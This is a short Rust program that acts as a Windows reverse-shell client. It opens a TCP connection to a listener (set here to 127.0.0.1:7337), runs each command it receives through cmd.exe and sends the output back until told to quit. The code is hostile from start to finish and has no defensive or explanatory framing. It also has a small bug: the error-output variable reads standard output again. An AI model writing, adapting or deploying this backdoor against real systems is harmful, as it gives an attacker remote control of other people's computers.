
use std::net::{Ipv4Addr,SocketAddrV4,TcpListener,TcpStream,Shutdown};
use std::process::{Command,exit};
use std::io::{self, Write, BufReader, BufRead};
use std::process::Output;

fn executecmd(cmd:&str) -> String{
    
    let temp: String = "/c ".to_owned();
    let fullcmd =  temp + cmd;

    let cmds: Vec<&str> = fullcmd.split(" ").collect();

    let res: Output = Command::new("cmd.exe").args(&cmds).output().unwrap();

    let stdout = String::from_utf8_lossy(res.stdout.as_slice());
    let stderr = String::from_utf8_lossy(res.stdout.as_slice());

    if stdout.len()>0{
        return stdout.to_string();
    }
    else{
        return stderr.to_string();
    }

}

fn main() {

    let mut client =TcpStream::connect("127.0.0.1:7337").unwrap();
    println!("Connected to: {}", client.peer_addr().unwrap());

    loop{

        let mut buffer:Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&client);
        reader.read_until(b'\0', &mut buffer);

        println!("reciever from server: {}", String::from_utf8_lossy(&buffer).trim());

        if buffer.len()==0 ||
        String::from_utf8_lossy(&buffer).trim_end_matches('\0')=="quit"{
            break;
        }
        let mut output =executecmd(String::from_utf8_lossy(&buffer).trim_end_matches('\0'));
        output.push('\0');

        client.write(&mut output.as_bytes());
    }

    client.shutdown(Shutdown::Both);

}
